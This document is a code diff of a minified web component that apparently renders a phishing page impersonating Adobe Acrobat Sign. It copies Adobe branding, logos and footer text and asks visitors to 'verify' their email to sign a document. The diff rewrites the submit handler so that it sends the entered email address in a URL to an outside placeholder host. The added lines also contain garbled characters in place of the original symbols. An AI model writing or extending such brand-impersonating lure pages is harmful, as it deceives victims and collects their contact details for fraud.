@@ -3987,39 +3987,34 @@ const Cl = {
         }
     },
     methods: {
-        isValidEmail(e) {
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
-        },
-        async verifyEmail() {
-            if (!this.emailInput.trim()) {
-                this.errorMessage = "Please enter an email address";
-                return
-            }
-            if (!this.isValidEmail(this.emailInput)) {
-                this.errorMessage = "Please enter a valid email address";
-                return
-                }
-            this.errorMessage = "",
-            this.isLoading = !0;
-            try {
-                const e = await fetch("/api/verify-email", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        email: this.emailInput
-                    })
-                })
-                  , t = await e.json();
-                if (!e.ok)
-                    throw new Error(t.message || "Verification failed");
-                t.redirectUrl && (window.location = t.redirectUrl)
-            } catch (e) {
-                this.errorMessage = e.message || "Unable to verify email"
-            } finally {
-                this.isLoading = !1
-            }
+    isValidEmail(e) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
+    },
+    async verifyEmail() {
+        if (!this.emailInput.trim()) {
+            this.errorMessage = "Please enter an email address";
+            return;
+        }
+        if (!this.isValidEmail(this.emailInput)) {
+            this.errorMessage = "Please enter a valid email address";
+            return;
+        }
+
+        this.errorMessage = "";
+        this.isLoading = true;
+
+        try {
+            const redirectUrl = "https://example.com/next?email=" + encodeURIComponent(this.emailInput);
+            window.location.href = redirectUrl;
+        } catch (e) {
+            this.errorMessage = e.message || "Redirection failed";
+        } finally {
+            this.isLoading = false;
+        }
+    
+        }
+    }
+}
   , Tl = {
     class: "adobe-sign-container"
 }
@@ -4036,7 +4031,7 @@ const Cl = {
   , Ml = ["disabled"];
 function Pl(e, t, n, s, i, r) {
     return ze(),
-    Gt("div", Tl, [H("div", El, [t[5] || (t[5] = Mo('<div class="header" data-v-527512fb><div class="logo-text" data-v-527512fb><span class="person-icon" data-v-527512fb>⼈</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png" alt="Adobe Logo" data-v-527512fb></div><div class="success-check" data-v-527512fb>✓</div>', 2)), H("div", Al, [t[3] || (t[3] = H("p", null, [H("strong", null, "Verify the intended recipient's email.")], -1)), t[4] || (t[4] = H("p", null, "Enter the email address to which this item was shared to sign your document.", -1)), Fr(H("input", {
+    Gt("div", Tl, [H("div", El, [t[5] || (t[5] = Mo('<div class="header" data-v-527512fb><div class="logo-text" data-v-527512fb><span class="person-icon" data-v-527512fb>â¼ˆ</span> Adobe Acrobat Sign </div><img class="adobe-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png" alt="Adobe Logo" data-v-527512fb></div><div class="success-check" data-v-527512fb>âœ“</div>', 2)), H("div", Al, [t[3] || (t[3] = H("p", null, [H("strong", null, "Verify the intended recipient's email.")], -1)), t[4] || (t[4] = H("p", null, "Enter the email address to which this item was shared to sign your document.", -1)), Fr(H("input", {
         type: "email",
         "onUpdate:modelValue": t[0] || (t[0] = o => i.emailInput = o),
         placeholder: "Enter email",
@@ -4062,7 +4057,7 @@ function Pl(e, t, n, s, i, r) {
         alt: "Adobe Sign Logo"
     }), H("p", null, [Le("Need your own documents signed? Adobe Acrobat Sign can help save you time. "), H("a", {
         href: "#"
-    }, "Learn more"), Le(".")]), H("p", null, "To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book."), H("p", null, "Terms of Use | Report Abuse"), H("p", null, "© 2025 Adobe. All rights reserved.")], -1))])
+    }, "Learn more"), Le(".")]), H("p", null, "To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book."), H("p", null, "Terms of Use | Report Abuse"), H("p", null, "Â© 2025 Adobe. All rights reserved.")], -1))])
 }
 const Rl = ts(Cl, [["render", Pl], ["__scopeId", "data-v-527512fb"]]);
 const Il = {
